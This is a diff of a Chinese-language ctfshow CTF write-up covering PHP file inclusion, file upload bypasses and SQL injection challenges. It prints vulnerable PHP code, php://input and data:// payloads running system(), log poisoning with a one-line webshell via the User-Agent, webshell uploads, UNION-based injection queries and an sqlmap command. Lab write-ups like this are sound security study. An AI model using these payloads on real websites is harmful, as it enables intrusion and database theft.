@@ -865,6 +865,7 @@ if(isset($_GET['c'])){
 
 网站源码为：
 
+```
 <?php
 
 
@@ -875,6 +876,7 @@ if(isset($_GET['file'])){
 }else{
     highlight_file(__FILE__);
 }
+```
 
 没有任何的过滤
 
@@ -894,6 +896,7 @@ payload：?file=php://filter/convert.base64-encode/resource=flag.php
 
 换别的协议吧，比如说data://,file://。
 
+```
 <?php
 
 
@@ -905,6 +908,7 @@ if(isset($_GET['file'])){
 }else{
     highlight_file(__FILE__);
 }
+```
 
 构造payload:?file=data://text/plain,<?=system('tac flag*');?>
 
@@ -922,6 +926,7 @@ if(isset($_GET['file'])){
 
 思路，更改大小写来绕过。
 
+```
 <?php
 
 if(isset($_GET['file'])){
@@ -932,6 +937,7 @@ if(isset($_GET['file'])){
 }else{
   highlight_file(__FILE__);
 }
+```
 
 payload:?file=PHP://input,然后需要构建POST请求。此处使用到BurpSuite，
 
@@ -947,10 +953,11 @@ payload:?file=PHP://input，POST：<? php system("tac f*");?>
 
 
 
-### web81(未完成)
+### web81
 
 吊毛，这次把冒号过滤掉了，那就用url编码%3A代替。
 
+```
 <?php
 
 if(isset($_GET['file'])){
@@ -962,6 +969,7 @@ if(isset($_GET['file'])){
 }else{
   highlight_file(__FILE__);
 }
+```
 
 payload:?file=PHP%3A//input,POST:<?php system("ls");?>
 
@@ -969,13 +977,223 @@ payload:?file=PHP%3A//input,POST:<?php system("ls");?>
 
 但还有日志可以用，?file=/var/log/nginx/access.log，发现它读取了很多的UA
 
-那就在UA里面做手脚。
+那就在UA里面做手脚。抓包，UA插一句话木马，然后对着这个文件用AntSword，刀它！
+
+在/var/www/html/fl0g.php中发现了flag
+
+![](.\文件包含\图片\web81.png)
+
+
+
+### web82
+
+文件包含
+
+**竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件**
+
+嗯？竞争环境？
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 19:34:45
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    $file = str_replace(":", "???", $file);
+    $file = str_replace(".", "???", $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+好吧，php和data被锁了，冒号和点号被封了。这下后门都上不了了。
+
+根据题目提示，使用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含。
+
+然而这题得熬夜做……今天就算了。
+
+
+
+
 
 
 
 ## php特性
 
+## 文件上传
+
+### web151
+
+前台校验不可靠
+
+那就改前端，按F12打开控制台。找到前端检查文件格式的地方，发现可以更改例外情况，那就把png改为php，上传一句话木马，然后AntSword连接即可。
+
+![前端弱点](.\文件上传\web151\找到前端弱点.png)
+
+在/var/www/html中找到flag.php，打开它得到flag。
+
+![发现flag](.\文件上传\web151\得到flag.png)
+
+
+
+### web152
+
+后端不能单一校验
+
+开局和web151一样的操作，先改前端使其能够上传php文件，然后发现它拒绝了，看来文件类型被人发现不对头了。
+
+加个头试试？还是不合规。
+
+那改变文件类型试试？想多了，文件类型改了就失效了。
+
+看来必须得上传一个图片。
+
+使用bp抓包，先将一句话木马改为png格式成功上传，抓包成功后然后修改回php的后缀解析在放包。
+
+AntSword连接，成功
+
+在/var/www/html里面找到了藏有flag的flag.php文件
+
+![web152](.\文件上传\web152.png)
+
+
+
+### web153（未完成）
+
 ## SQL注入
+
+> 手动注入基本步骤：所有语句末尾接%23
+>
+> 1. 查询闭合条件:  空格/单引号/两个单引号…… ，测试到再度正常为止
+> 2. 测试字段数：闭合 order by，查到异常到再度正常为止
+> 3. 查回显字段：闭合 union select 所有段 查看结果
+> 4. 爆库名：回显字段替换为database()
+> 5. 爆表名：回显字段替换为group_concat(schema_name)，末尾接上from information_schema.schemata
+> 6. 爆字段：回显字段替换为group_concat(table_name)，末尾接上from information_schema.tables where table_schema=database()
+> 7. 爆对应字段的所有列的值：回显字段替换为group_concat(column_name),末尾接上 from information_schema.columns where table_name='字段名'
+> 8. 爆对应列的对应值：回显字段替换为group_concat(所有想要的列)，末尾接上from 对应字段
+>
+> 
+
+### web171
+
+使用sqlmap是没有灵魂的，你在内涵谁？
+
+等会儿就去Github上学习sqlmap的源代码，学会了再用这个，就有灵魂了（乐）。
+
+```
+//拼接sql语句查找指定ID用户
+$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
+```
+
+入门的sql注入 这道题目其实就是最简单的sql注入的例子，这里会把输入的id以get的形式直接递交到后台和查询语句进行简单的字符串拼接的过程，同时根据这个题目的查询条件，可以猜测username为为flag的用户他的信息就是我们所需要的。
+
+但是网页里所展示的24个用户并没有我们所需要的flag
+
+这里主要的思路就是**用or进行截断，然后or后面跟我们所需要查询的语句**
+
+'我们传入的语句'
+
+首先我们给前面一个查询语句一个不可能达成的条件去截断它，即**-1'**
+
+然后用or加上我们所要查询的 or username = 'flag'.我们语句外面还有一个引号。所以我们不要最后一个引号
+
+最后的语句就是这样 -1' or username = 'flag
+
+![](.\SQL注入\web171.png)
+
+尝试使用sqlmap解决此题：
+
+```
+sqlmap -u "http://cde6efe9-40f8-430c-9698-5cdac62609b6.challenge.ctf.show/?id=1" --dbs --batch
+```
+
+想多了，别人把GET请求隔离了，专门放CSRF攻击的。
+
+
+
+### web172
+
+撸猫为主，要什么flag？
+
+我就要！
+
+进入环境，查看页面源码，发现select.js
+
+看到查询时的url是/api/?id=
+
+![](.\SQL注入\web172\完成注入.png)
+
+先上手动注入流程：
+
+1. 查看页面源码，发现select.js
+
+   看到查询时的url是/api/?id=
+
+   /api/?id=1' order by 3%23
+
+   /api/?id=1' union select 1,2,3%23
+
+   /api/?id=1' union select 1,2,database()%23
+
+   联合查询
+
+   /api/?id=1' union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23
+
+   /api/?id=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23
+
+   /api/?id=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23
+
+   看到有3列 id,username,password
+
+   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23
+
+   查询password发现没有flag
+
+   查另一个表 ctfshow_user2
+
+   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23
+
+   看到flag
+
+   ![](.\SQL注入\web172\完成注入.png)
+
+
+
+### web173
+
+考查sql基础
+
+api/?id= 还是一如既往，开始手动注入
+
+1. 闭合为1’
+2. order by 检查有3段
+3. 三段均可显示，nice
+4. 数据库名：ctfshow_web
+5. 表名：information_schema,test,mysql,performance_schema,ctfshow_web
+6. ctfshow_web列名：ctfshow_user,ctfshow_user2,ctfshow_user3
+7. ctfshow_user行名：没有
+8. ctfshow_user2行名：没有
+9. ctfshow_user3行名：id,username,password
+10. ?id=1' union select id,username,password from ctfshow_user3%23，得到ctfshow{48d10635-f753-4e3a-bd14-b11b924dc67c}
+
+![](.\SQL注入\web173.png)
+
+
 
 ## 反序列化
 
